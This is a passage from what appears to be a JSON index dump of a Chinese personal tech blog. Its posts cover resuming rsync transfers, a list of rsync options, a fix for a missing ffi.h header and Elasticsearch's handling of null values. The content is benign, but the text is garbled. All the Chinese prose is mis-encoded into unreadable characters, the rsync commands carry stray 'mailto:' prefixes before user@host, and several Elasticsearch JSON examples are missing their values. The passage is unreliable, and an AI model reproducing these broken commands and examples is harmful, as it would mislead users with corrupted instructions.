65535;}","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"å‹åŠ›æµ‹è¯•","slug":"å‹åŠ›æµ‹è¯•","permalink":"https://wangxiuwen.github.io/tags/%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95/"}],"author":"wangxiuwen"},{"title":"rsync çš„æ–­ç‚¹ç»­ä¼ ","slug":"history/tech/5953c4d0c2b92f5665eeda2c","date":"2016-04-10T03:47:16.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda2c/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda2c/","excerpt":"","text":"ç»å¸¸copyå¤§æ–‡ä»¶ï¼Œç”±äºæœåŠ¡å™¨ã€è·¯ç”±ç­‰ç½‘ç»œçš„ä¸ç¡®å®šæ€§ï¼Œè€æ˜¯å‡ºç°remote server not responding.äºæ˜¯æŸ¥äº†ä¸‹èµ„æ–™ï¼Œå‘ç°rsyncè¿™ä¸ªå·¥å…·æ”¯æŒæ–­ç‚¹ç»­ä¼ åŠŸèƒ½ï¼Œè¿™é‡Œä»‹ç»ä¸€ä¸‹ã€‚rsyncä¹Ÿåˆ†æœåŠ¡å™¨ç«¯å’Œå®¢æˆ·ç«¯ï¼Œä½¿ç”¨manæŸ¥çœ‹å¸®åŠ©ä¿¡æ¯ï¼Œæˆ‘ä»¬å‘ç°rsyncæœ‰å…­ç§ä¸åŒçš„å·¥ä½œæ¨¡å¼ï¼šLocal: rsync SRCâ€¦Access via remote shell:Pull: rsync HOST:SRC...Push: rsync SRC... HOST:DESTAccess via rsync daemon:Pull: rsync HOST::SRC...rsync rsync://HOST/SRC...Push: rsync SRC... HOST::DESTrsync SRC... rsync://HOST/DESTList remote files: rsync ... rsync://HOST/SRC1. æ‹·è´æœ¬åœ°æ–‡ä»¶ï¼›å½“SRCå’ŒDESè·¯å¾„ä¿¡æ¯éƒ½ä¸åŒ…å«æœ‰å•ä¸ªå†’å·\":\"åˆ†éš”ç¬¦æ—¶å°±å¯åŠ¨è¿™ç§å·¥ä½œæ¨¡å¼ã€‚ 2.ä½¿ç”¨ä¸€ä¸ªè¿œç¨‹shellç¨‹åºï¼ˆå¦‚rshã€sshï¼‰æ¥å®ç°å°†æœ¬åœ°æœºå™¨çš„å†…å®¹æ‹·è´åˆ°è¿œç¨‹æœºå™¨ã€‚å½“DST è·¯å¾„åœ°å€åŒ…å«å•ä¸ªå†’å·\":\"åˆ†éš”ç¬¦æ—¶å¯åŠ¨è¯¥æ¨¡å¼ã€‚ 3.ä½¿ç”¨ä¸€ä¸ªè¿œç¨‹shellç¨‹åºï¼ˆå¦‚rshã€sshï¼‰æ¥å®ç°å°†è¿œç¨‹æœºå™¨çš„å†…å®¹æ‹·è´åˆ°æœ¬åœ°æœºå™¨ã€‚å½“SRC åœ°å€è·¯å¾„åŒ…å«å•ä¸ªå†’å·\":\"åˆ†éš”ç¬¦æ—¶å¯åŠ¨è¯¥æ¨¡å¼ã€‚ 4. ä»è¿œç¨‹rsyncæœåŠ¡å™¨ä¸­æ‹·è´æ–‡ä»¶åˆ°æœ¬åœ°æœºã€‚å½“SRCè·¯å¾„ä¿¡æ¯åŒ…å«\"::\"åˆ†éš”ç¬¦æ—¶å¯åŠ¨è¯¥æ¨¡å¼ã€‚ 5. ä»æœ¬åœ°æœºå™¨æ‹·è´æ–‡ä»¶åˆ°è¿œç¨‹rsyncæœåŠ¡å™¨ä¸­ã€‚å½“DSTè·¯å¾„ä¿¡æ¯åŒ…å«\"::\"åˆ†éš”ç¬¦æ—¶å¯åŠ¨è¯¥æ¨¡å¼ã€‚ 6. åˆ—è¿œç¨‹æœºçš„æ–‡ä»¶åˆ—è¡¨ã€‚è¿™ç±»ä¼¼äºrsyncä¼ è¾“ï¼Œä¸è¿‡åªè¦åœ¨å‘½ä»¤ä¸­çœç•¥æ‰æœ¬åœ°æœºä¿¡æ¯å³å¯ã€‚ä¸‹é¢ä»¥å®ä¾‹æ¥è¯´æ˜ï¼š # rsync -vazu -progress mailto:cnangel@10.1.6.160:~/works/ ~/works vï¼šè¯¦ç»†æç¤º aï¼šä»¥archiveæ¨¡å¼æ“ä½œï¼Œå¤åˆ¶ç›®å½•ã€ç¬¦å·è¿æ¥ï¼Œç­‰ä»·äº -rlptgoD ã€‚ zï¼šå‹ç¼© uï¼šåªè¿›è¡Œæ›´æ–°ï¼Œé˜²æ­¢æœ¬åœ°æ–°æ–‡ä»¶è¢«é‡å†™ï¼Œæ³¨æ„ä¸¤è€…æœºå™¨çš„æ—¶é’Ÿçš„åŒæ—¶ -progressï¼šæŒ‡æ˜¾ç¤º ä»¥ä¸Šå‘½ä»¤æ˜¯ä¿æŒå®¢æˆ·æœº10.1.6.160ä¸Šçš„$HOME/worksç›®å½•å’Œå½“å‰æœºå™¨çš„$HOME/worksç›®å½•åŒæ­¥ã€‚è¿™ç»å¸¸æ˜¯æˆ‘ä»¬æ‰€è¯´çš„é•œåƒåŒæ­¥å°±æ˜¯è¿™ä¹ˆæ¥çš„ï¼Œå¦‚æœæ–­ç‚¹ç»­ä¼ å‘¢ï¼Ÿrsyncå®Œå…¨å¯ä»¥åšåˆ°è¿™ä¸€ç‚¹ã€‚manæ‰‹å†Œå†æ¬¡å‘Šè¯‰æˆ‘ä»¬ï¼š--partialBy default, rsync will delete any partially transferred file if the transfer isinterrupted. In some circumstances it is more desirable to keep partially transferredfiles. Using the --partial option tells rsync to keep the partial file which shouldmake a subsequent transfer of the rest of the file much faster.--partial-dir=DIRA better way to keep partial files than the --partial option is to specify a DIR thatwill be used to hold the partial data (instead of writing it out to the destinationfile). On the next transfer, rsync will use a file found in this dir as data tospeed up the resumption of the transfer and then delete it after it has served itspurpose.é»˜è®¤çš„æƒ…å†µä¸‹ï¼Œå½“rsyncä¼ è¾“ä¸­æ–­åï¼Œæ–°çš„rsyncä¼ è¾“å°†åˆ é™¤æ‰€æœ‰çš„æœªå®Œæˆçš„æ®‹ä½™æ–‡ä»¶ç‰‡æ®µï¼Œç„¶åå¼€å§‹æ–°çš„ä¼ è¾“ã€‚è€Œä½¿ç”¨--partialåï¼Œå°†ä¼šè¿›è¡Œæˆ‘ä»¬æ‰€è¯´çš„æ–­ç‚¹ç»­ä¼ ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯-Pè¿™ä¸ªå‚æ•°æ˜¯ç»¼åˆäº†--partial --progressä¸¤ä¸ªå‚æ•°ï¼Œæ‰€ä»¥rsyncçš„æ–­ç‚¹ç»­ä¼ å¯ä»¥ç”¨ä¸‹é¢çš„ä¾‹å­æ¥è¯´æ˜ï¼š# _rsync_ -avzP /tmp/bigfile mailto:cnangel@10.1.6.160:/tmp/bigfileå¦å¤–ï¼Œè¿˜æœ‰ä¸¤ä¸ªå‚æ•°ä¹Ÿç»å¸¸ç”¨åˆ°ï¼š tï¼šä¿®æ”¹æ¬¡æ•° rï¼šé€’å½’æ–¹å¼","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"rsync","slug":"history/tech/5953c4d0c2b92f5665eeda2b","date":"2016-04-10T03:46:39.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda2b/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda2b/","excerpt":"","text":"é‡åˆ°çš„é—®é¢˜æ˜¯å‡ å°æ¸¸æˆæœåŠ¡å™¨ï¼Œæœ‰ä¸€å°æ–°çš„æœåŠ¡å™¨ä¹‹å‰å·²ç»copy(http://www.cnblogs.com/meteoric_cry/archive/2011/03/29/1998581.html)è¿‡æ–‡ä»¶ä¸Šå»ï¼Œä½†åœ¨æµ‹è¯•çš„è¿‡ç¨‹ä¸­å‘ç°è¿˜æ˜¯å›¾ç‰‡æ— æ³•æ­£å¸¸ä¸æ˜¾ç¤ºå‡ºæ¥ï¼Œç„¶åç”¨httpwatchå»åˆ†æè¯·æ±‚çš„èµ„æºï¼Œå‘ç°æœ‰ä¸€ä¸ªå›¾ç‰‡è¯·æ±‚çš„åœ°å€æ˜¯404ï¼ˆæ–‡ä»¶ä¸å­˜åœ¨ï¼‰ï¼Œç„¶åsshç™»å½•ä¸Šå»ï¼Œæ‰¾åˆ°æŒ‡å®šç›®å½•ï¼Œå‘ç°ç¡®å®æ˜¯æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶ã€‚ã€‚ã€‚ä¸ºäº†ä¸è‡³äºå†copyä¸€æ¬¡ï¼Œå°±éœ€è¦ä½¿ç”¨æ–‡ä»¶åŒæ­¥çš„ç®¡ç†è½¯ä»¶äº†ï¼ŒåŒäº‹æ¨èäº†linuxä¸‹çš„rsyncï¼Œå°è¯•äº†ä¸€ä¸‹ï¼Œè¿˜æ˜¯å¾ˆä¸é”™çš„ã€‚å‡è®¾æœ‰æœåŠ¡å™¨A å’Œ æœåŠ¡å™¨Bï¼Œç°åœ¨ç™»å½•äº†æœåŠ¡å™¨Bï¼Œéœ€è¦å°†æœåŠ¡å™¨Aä¸Šçš„æ–‡ä»¶åŒæ­¥åˆ°æœåŠ¡å™¨Bä¸­ï¼Œå°†Aä¸­æœ‰çš„Bä¸­æ²¡æœ‰çš„ï¼Œæˆ–æ˜¯Aä¸­æ–‡ä»¶æ¯”Bä¸­çš„æ–‡ä»¶è¦æ–°å°±å…¨éƒ¨copyè¿‡æ¥ã€‚shellå‘½ä»¤å¦‚ä¸‹ï¼šrsync -zvrtopg -progress -e â€˜ssh -p ç«¯å£å·â€™ mailto:root@192.xx.xx.xx:/æ–‡ä»¶ç›®å½•/ æœ¬æœºçš„ç›®å½•åœ°å€è¯­æ³•****rsync -å‚æ•° â€˜æºæ–‡ä»¶è®¿é—®è·¯å¾„â€™****ç›®æ ‡è·¯å¾„ç¬¬ä¸€æ¬¡ç”¨çš„æ—¶å€™ï¼Œæˆ‘åœ¨æºæœåŠ¡å™¨ï¼ˆå³ä¸Šé¢æ‰€æŒ‡çš„æœåŠ¡å™¨Aï¼‰ä¸­çš„æ–‡ä»¶ç›®å½•æ²¡æœ‰åŠ /å¯¼è‡´åæ¥ç›´æ¥æŠŠé‚£ä¸ªç›®å½•copyè¿‡æ¥äº†ï¼Œè€Œä¸æ˜¯å®ƒç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å…³äºrsync è¿™ä¸ªå‘½ä»¤çš„ä¸€äº›å‚æ•°ï¼Œè‹±æ–‡å¥½ç‚¹å°±è‡ªå·±ç›´æ¥ä½¿ç”¨rsync --helpå»æŸ¥çœ‹äº†ï¼Œè¿™é‡Œä»å…¶å®ƒäººå†™çš„åšå®¢ä¸­è½¬è½½è¿‡æ¥çš„ã€‚å‚è€ƒäº†ï¼šhttp://hi.baidu.com/webv/blog/item/7c787a06581dab7e0208819a.htmlhttp://wandering.blog.51cto.com/467932/105113ä½¿ç”¨ä¹‹å‰éœ€è¦å…ˆå®‰è£…rsyncï¼Œè¿™ä¸ªç›´æ¥è‡ªè¡Œæœç´¢å§â€¦å…³äºå‚æ•°çš„è¯´æ˜ï¼š-v, --verbose è¯¦ç»†æ¨¡å¼è¾“å‡º-q, --quiet ç²¾ç®€è¾“å‡ºæ¨¡å¼-c, --checksum æ‰“å¼€æ ¡éªŒå¼€å…³ï¼Œå¼ºåˆ¶å¯¹æ–‡ä»¶ä¼ è¾“è¿›è¡Œæ ¡éªŒ-a, --archive å½’æ¡£æ¨¡å¼ï¼Œè¡¨ç¤ºä»¥é€’å½’æ–¹å¼ä¼ è¾“æ–‡ä»¶ï¼Œå¹¶ä¿æŒæ‰€æœ‰æ–‡ä»¶å±æ€§ï¼Œç­‰äº-rlptgoD-r, --recursive å¯¹å­ç›®å½•ä»¥é€’å½’æ¨¡å¼å¤„ç†-R, --relative ä½¿ç”¨ç›¸å¯¹è·¯å¾„ä¿¡æ¯rsync foo/bar/foo.c remote:/tmp/åˆ™åœ¨/tmpç›®å½•ä¸‹åˆ›å»ºfoo.cæ–‡ä»¶ï¼Œè€Œå¦‚æœä½¿ç”¨-Rå‚æ•°ï¼šrsync -R foo/bar/foo.c remote:/tmp/åˆ™ä¼šåˆ›å»ºæ–‡ä»¶/tmp/foo/bar/foo.cï¼Œä¹Ÿå°±æ˜¯ä¼šä¿æŒå®Œå…¨è·¯å¾„ä¿¡æ¯ã€‚-b, --backup åˆ›å»ºå¤‡ä»½ï¼Œä¹Ÿå°±æ˜¯å¯¹äºç›®çš„å·²ç»å­˜åœ¨æœ‰åŒæ ·çš„æ–‡ä»¶åæ—¶ï¼Œå°†è€çš„æ–‡ä»¶é‡æ–°å‘½åä¸º~filenameã€‚å¯ä»¥ä½¿ç”¨â€“suffixé€‰é¡¹æ¥æŒ‡å®šä¸åŒçš„å¤‡ä»½æ–‡ä»¶å‰ç¼€ã€‚â€“backup-dir å°†å¤‡ä»½æ–‡ä»¶(å¦‚~filename)å­˜æ”¾åœ¨åœ¨ç›®å½•ä¸‹ã€‚-suffix=SUFFIX å®šä¹‰å¤‡ä»½æ–‡ä»¶å‰ç¼€-u, --update ä»…ä»…è¿›è¡Œæ›´æ–°ï¼Œä¹Ÿå°±æ˜¯è·³è¿‡æ‰€æœ‰å·²ç»å­˜åœ¨äºDSTï¼Œå¹¶ä¸”æ–‡ä»¶æ—¶é—´æ™šäºè¦å¤‡ä»½çš„æ–‡ä»¶ã€‚(ä¸è¦†ç›–æ›´æ–°çš„æ–‡ä»¶)-l, --links ä¿ç•™è½¯é“¾ç»“-L, --copy-links æƒ³å¯¹å¾…å¸¸è§„æ–‡ä»¶ä¸€æ ·å¤„ç†è½¯é“¾ç»“â€“copy-unsafe-links ä»…ä»…æ‹·è´æŒ‡å‘SRCè·¯å¾„ç›®å½•æ ‘ä»¥å¤–çš„é“¾ç»“â€“safe-links å¿½ç•¥æŒ‡å‘SRCè·¯å¾„ç›®å½•æ ‘ä»¥å¤–çš„é“¾ç»“-H, --hard-links ä¿ç•™ç¡¬é“¾ç»“-p, --perms ä¿æŒæ–‡ä»¶æƒé™-o, --owner ä¿æŒæ–‡ä»¶å±æ€§ä¿¡æ¯-g, --group ä¿æŒæ–‡ä»¶å±ç»„ä¿¡æ¯-D, --devices ä¿æŒè®¾å¤‡æ–‡ä»¶ä¿¡æ¯-t, --times ä¿æŒæ–‡ä»¶æ—¶é—´ä¿¡æ¯-S, --sparse å¯¹ç¨€ç–æ–‡ä»¶è¿›è¡Œç‰¹æ®Šå¤„ç†ä»¥èŠ‚çœDSTçš„ç©ºé—´-n, --dry-runç°å®å“ªäº›æ–‡ä»¶å°†è¢«ä¼ è¾“-W, --whole-file æ‹·è´æ–‡ä»¶ï¼Œä¸è¿›è¡Œå¢é‡æ£€æµ‹-x, --one-file-system ä¸è¦è·¨è¶Šæ–‡ä»¶ç³»ç»Ÿè¾¹ç•Œ-B, --block-size=SIZE æ£€éªŒç®—æ³•ä½¿ç”¨çš„å—å°ºå¯¸ï¼Œé»˜è®¤æ˜¯700å­—èŠ‚-e, --rsh=COMMAND æŒ‡å®šæ›¿ä»£rshçš„shellç¨‹åºâ€“rsync-path=PATH æŒ‡å®šè¿œç¨‹æœåŠ¡å™¨ä¸Šçš„rsyncå‘½ä»¤æ‰€åœ¨è·¯å¾„ä¿¡æ¯-C, --cvs-exclude ä½¿ç”¨å’ŒCVSä¸€æ ·çš„æ–¹æ³•è‡ªåŠ¨å¿½ç•¥æ–‡ä»¶ï¼Œç”¨æ¥æ’é™¤é‚£äº›ä¸å¸Œæœ›ä¼ è¾“çš„æ–‡ä»¶â€“existing ä»…ä»…æ›´æ–°é‚£äº›å·²ç»å­˜åœ¨äºDSTçš„æ–‡ä»¶ï¼Œè€Œä¸å¤‡ä»½é‚£äº›æ–°åˆ›å»ºçš„æ–‡ä»¶â€“delete åˆ é™¤é‚£äº›DSTä¸­SRCæ²¡æœ‰çš„æ–‡ä»¶â€“delete-excluded åŒæ ·åˆ é™¤æ¥æ”¶ç«¯é‚£äº›è¢«è¯¥é€‰é¡¹æŒ‡å®šæ’é™¤çš„æ–‡ä»¶â€“delete-after ä¼ è¾“ç»“æŸä»¥åå†åˆ é™¤â€“ignore-errors åŠæ—¶å‡ºç°IOé”™è¯¯ä¹Ÿè¿›è¡Œåˆ é™¤â€“max-delete=NUM æœ€å¤šåˆ é™¤NUMä¸ªæ–‡ä»¶â€“partial ä¿ç•™é‚£äº›å› æ•…æ²¡æœ‰å®Œå…¨ä¼ è¾“çš„æ–‡ä»¶ï¼Œä»¥æ˜¯åŠ å¿«éšåçš„å†æ¬¡ä¼ è¾“â€“force å¼ºåˆ¶åˆ é™¤ç›®å½•ï¼Œå³ä½¿ä¸ä¸ºç©ºâ€“numeric-ids ä¸å°†æ•°å­—çš„ç”¨æˆ·å’Œç»„IDåŒ¹é…ä¸ºç”¨æˆ·åå’Œç»„åâ€“timeout=TIME IPè¶…æ—¶æ—¶é—´ï¼Œå•ä½ä¸ºç§’-I, --ignore-times ä¸è·³è¿‡é‚£äº›æœ‰åŒæ ·çš„æ—¶é—´å’Œé•¿åº¦çš„æ–‡ä»¶â€“size-only å½“å†³å®šæ˜¯å¦è¦å¤‡ä»½æ–‡ä»¶æ—¶ï¼Œä»…ä»…å¯Ÿçœ‹æ–‡ä»¶å¤§å°è€Œä¸è€ƒè™‘æ–‡ä»¶æ—¶é—´â€“modify-window=NUM å†³å®šæ–‡ä»¶æ˜¯å¦æ—¶é—´ç›¸åŒæ—¶ä½¿ç”¨çš„æ—¶é—´æˆ³çª—å£ï¼Œé»˜è®¤ä¸º0-T --temp-dir=DIR åœ¨DIRä¸­åˆ›å»ºä¸´æ—¶æ–‡ä»¶â€“compare-dest=DIR åŒæ ·æ¯”è¾ƒDIRä¸­çš„æ–‡ä»¶æ¥å†³å®šæ˜¯å¦éœ€è¦å¤‡ä»½-P ç­‰åŒäº --partialâ€“progress æ˜¾ç¤ºå¤‡ä»½è¿‡ç¨‹-z, --compress å¯¹å¤‡ä»½çš„æ–‡ä»¶åœ¨ä¼ è¾“æ—¶è¿›è¡Œå‹ç¼©å¤„ç†â€“exclude=PATTERN æŒ‡å®šæ’é™¤ä¸éœ€è¦ä¼ è¾“çš„æ–‡ä»¶æ¨¡å¼â€“include=PATTERN æŒ‡å®šä¸æ’é™¤è€Œéœ€è¦ä¼ è¾“çš„æ–‡ä»¶æ¨¡å¼â€“exclude-from=FILE æ’é™¤FILEä¸­æŒ‡å®šæ¨¡å¼çš„æ–‡ä»¶â€“include-from=FILE ä¸æ’é™¤FILEæŒ‡å®šæ¨¡å¼åŒ¹é…çš„æ–‡ä»¶â€“version æ‰“å°ç‰ˆæœ¬ä¿¡æ¯â€“address ç»‘å®šåˆ°ç‰¹å®šçš„åœ°å€â€“config=FILE æŒ‡å®šå…¶ä»–çš„é…ç½®æ–‡ä»¶ï¼Œä¸ä½¿ç”¨é»˜è®¤çš„rsyncd.confæ–‡ä»¶â€“port=PORT æŒ‡å®šå…¶ä»–çš„rsyncæœåŠ¡ç«¯å£â€“blocking-io å¯¹è¿œç¨‹shellä½¿ç”¨é˜»å¡IO-stats ç»™å‡ºæŸäº›æ–‡ä»¶çš„ä¼ è¾“çŠ¶æ€â€“progress åœ¨ä¼ è¾“æ—¶ç°å®ä¼ è¾“è¿‡ç¨‹â€“log-format=FORMAT æŒ‡å®šæ—¥å¿—æ–‡ä»¶æ ¼å¼â€“password-file=FILE ä»FILEä¸­å¾—åˆ°å¯†ç â€“bwlimit=KBPS é™åˆ¶I/Oå¸¦å®½ï¼ŒKBytes per second-h, --help æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯ä¸€èˆ¬å¸¸ç”¨çš„ï¼š-v è¯¦ç»†æ¨¡å¼è¾“å‡º-r å¯¹å­ç›®å½•ä»¥é€’å½’æ¨¡å¼å¤„ç†-t ä¿æŒæ–‡ä»¶çš„æ—¶é—´ä¿¡æ¯-o ä¿æŒæ–‡ä»¶çš„å±æ€§ä¿¡æ¯-g ä¿æŒæ–‡ä»¶å±ç»„çš„ä¿¡æ¯ï¼ˆä¸æ¸…æ¥šè¿™æ ·ç¿»è¯‘æ˜¯å¦æœ‰é—®é¢˜ï¼‰-p ä¿æŒæ–‡ä»¶æƒé™ä¸å˜-e, --rsh=COMMAND æŒ‡å®šæ›¿ä»£rshçš„shellç¨‹åº-z, --compress å¯¹å¤‡ä»½çš„æ–‡ä»¶åœ¨ä¼ è¾“æ—¶è¿›è¡Œå‹ç¼©å¤„ç†â€“progress æ˜¾ç¤ºå¤‡ä»½è¿‡ç¨‹ä¹Ÿå°±æ˜¯ï¼šé€’å½’ã€ä¿è¯æ–‡ä»¶ä¸€äº›åŸºæœ¬å±æ€§ä¸å˜(åˆ›å»º/ä¿®æ”¹æ—¶é—´ æƒé™ç­‰)ã€ä¼ è¾“æ–‡ä»¶æ—¶å‹ç¼©ä»¥å‡å°‘å¸¦å®½æ¶ˆè€—ï¼Œå½“ç„¶è¿˜æœ‰ä¸€ä¸ªå°±çœ‹éœ€è¦äº†:æ˜¯å¦åˆ é™¤æºä¸­æ²¡æœ‰ï¼Œè€Œç›®æ ‡ä¸­åˆæœ‰çš„æ–‡ä»¶","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"ffi.h","slug":"history/tech/5953c4d0c2b92f5665eeda2a","date":"2016-04-09T04:04:08.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda2a/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda2a/","excerpt":"","text":"fatal error: ffi.h: No such file or directoryé€šè¿‡ä¸‹é¢çš„å‘½ä»¤å®‰è£…å¼€å‘æºæ–‡ä»¶è§£å†³ï¼šsudo apt-get install libffi-dev","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"python","slug":"python","permalink":"https://wangxiuwen.github.io/tags/python/"}],"author":"wangxiuwen"},{"title":"elasticsearch å¤„ç†ç©ºå€¼","slug":"history/tech/5953c4d0c2b92f5665eeda29","date":"2016-04-08T02:20:42.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda29/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda29/","excerpt":"","text":"è€ƒè™‘å‰é¢çš„ä¾‹å­ï¼Œå…¶ä¸­æ–‡æ¡£æœ‰ä¸€ä¸ªç§°ä¸º tags çš„å­—æ®µã€‚è¿™æ˜¯ä¸€ä¸ªå¤šå€¼å­—æ®µã€‚æ–‡æ¡£å¯ä»¥æœ‰ä¸€ä¸ªã€å¤šä¸ªæˆ–è€…æ²¡æœ‰æ ‡ç­¾ã€‚å¦‚æœå­—æ®µæ²¡æœ‰å€¼ï¼Œé‚£ä¹ˆå®ƒæ˜¯æ€ä¹ˆåœ¨å€’æ’ç´¢å¼•ä¸­å­˜å‚¨çš„å‘¢ï¼Ÿè¿™ä¸ªé—®é¢˜çœŸè¯¡å¼‚ï¼Œå› ä¸ºç­”æ¡ˆæ˜¯ï¼Œå®ƒå¹¶æ²¡æœ‰è¢«å­˜å‚¨ã€‚è®©æˆ‘ä»¬çœ‹ä¸€ä¸‹ä¸Šä¸€èŠ‚æåˆ°çš„å€’æ’ç´¢å¼•ï¼šTokenDocIDsopen_source2search1,2å¦‚ä½•å­˜å‚¨ä¸€ä¸ªåœ¨é‚£ä¸ªæ•°æ®ç»“æ„ä¸­ä¸å­˜åœ¨çš„å­—æ®µå‘¢ï¼Ÿå‹æ ¹ä¸è¡Œï¼å€’æ’ç´¢å¼•æ˜¯ä¸€ç³»åˆ— token å’ŒåŒ…å«å®ƒçš„æ–‡æ¡£çš„åˆ—è¡¨ã€‚å¦‚æœå­—æ®µä¸å­˜åœ¨ï¼Œé‚£ä¹Ÿä¸ä¼šä¿å­˜ä»»ä½• tokenï¼Œæ‰€ä»¥åœ¨å€’æ’ç´¢å¼•ä¸­ä¹Ÿä¸ä¼šæœ‰ä»»ä½•è¡¨ç¤ºã€‚æœ€ç»ˆï¼Œè¿™æ„å‘³ç€ nullã€[] å’Œ éƒ½æ˜¯ç­‰ä»·çš„ã€‚éƒ½ä¸å­˜åœ¨äºå€’æ’ç´¢å¼•ä¸­ï¼å¾ˆæ˜¾ç„¶ï¼ŒçœŸå®ä¸–ç•Œæ²¡æœ‰è¿™ä¹ˆç®€å•ï¼Œæ•°æ®çš„å­—æ®µç»å¸¸ä¼šä¸¢å¤±æˆ–è€…åŒ…å«æ˜¾å¼çš„ null æˆ–è€…ç©ºæ•°ç»„ã€‚ä¸ºäº†è§£å†³è¿™äº›é—®é¢˜ï¼Œelasticsearch æœ‰ä¸€äº›å·¥å…·æ¥å¤„ç†ç©ºå€¼æˆ–è€…ä¸¢å¤±çš„æ•°æ®ã€‚exists Filterexists è¿‡æ»¤å™¨æ˜¯ç¬¬ä¸€ä»¶æ­¦å™¨ã€‚è¿™ä¸ªè¿‡æ»¤å™¨è¿”å›ç‰¹å®šå­—æ®µä¸­æ‹¥æœ‰ä»»ä½•å€¼çš„æ–‡æ¡£ã€‚è®©æˆ‘ä»¬ä½¿ç”¨ tagging çš„ä¾‹å­ï¼Œç´¢å¼•å‡ ä¸ªæ ·æœ¬æ–‡æ¡£ï¼šPOST /my_index/posts/_bulk{ â€œindexâ€: { â€œ_idâ€: â€œ1â€ }}{ â€œtagsâ€ : } â€¦(1){ â€œindexâ€: { â€œ_idâ€: â€œ2â€ }}{ â€œtagsâ€ : } â€¦(2){ â€œindexâ€: { â€œ_idâ€: â€œ3â€ }}{ â€œother_fieldâ€ : â€œsome dataâ€ } â€¦(3){ â€œindexâ€: { â€œ_idâ€: â€œ4â€ }}{ â€œtagsâ€ : null } â€¦(4){ â€œindexâ€: { â€œ_idâ€: â€œ5â€ }}{ â€œtagsâ€ : } â€¦(5)(1) tags å­—æ®µæœ‰ä¸€ä¸ªå€¼(2) tags å­—æ®µæœ‰ä¸¤ä¸ªå€¼(3) tags å­—æ®µä¸¢å¤±(4) tags å­—æ®µè®¾ç½®ä¸º null(5) tag å­—æ®µæœ‰ä¸€ä¸ªå€¼å’Œä¸€ä¸ª nullæœ€ç»ˆçš„å€’æ’ç´¢å¼•å°±æ˜¯ï¼šTokenDocIDsopen_source2search1,2,5æˆ‘ä»¬çš„ç›®æ ‡æ˜¯æ‰¾åˆ°è®¾ç½®äº† tag çš„æ‰€æœ‰æ–‡æ¡£ã€‚ä¸ç®¡æ˜¯ tag æ˜¯ä»€ä¹ˆï¼Œåªè¦å®ƒå‡ºç°åœ¨æ–‡æ¡£ä¸­ã€‚åœ¨ SQL ä¸­ï¼Œæˆ‘ä»¬é€šå¸¸å¯ä»¥ä½¿ç”¨ IS NOT NULL æŸ¥è¯¢ï¼šSELECT tagsFROM postsWHERE tags IS NOT NULLåœ¨ elasticsearch ä¸­ï¼Œæˆ‘ä»¬å°±ä½¿ç”¨ exists è¿‡æ»¤å™¨ï¼šGET /my_index/posts/_search{ â€œqueryâ€ : { â€œfilteredâ€ : { â€œfilterâ€ : { â€œexistsâ€ : { â€œfieldâ€ : â€œtagsâ€ }}}}}æœ€åè¿”å›ä¸‰ä¸ªæ–‡æ¡£ï¼šâ€œhitsâ€ : [ { â€œ_idâ€ : â€œ1â€, â€œ_scoreâ€ : 1.0, â€œ_sourceâ€ : { â€œtagsâ€ : } }, { â€œ_idâ€ : â€œ5â€, â€œ_scoreâ€ : 1.0, â€œ_sourceâ€ : { â€œtagsâ€ : } â€¦(1) }, { â€œ_idâ€ : â€œ2â€, â€œ_scoreâ€ : 1.0, â€œ_sourceâ€ : { â€œtagsâ€ : } }](1) æ–‡æ¡£ 5 å³ä½¿åŒ…å« null å€¼ä¹Ÿè¿”å›äº†ã€‚å› ä¸ºçœŸå®å€¼çš„ tag è¢«ç´¢å¼•äº†ï¼Œæ‰€ä»¥è¿™ä¸ªå­—æ®µå­˜åœ¨ã€‚æ‰€ä»¥ null 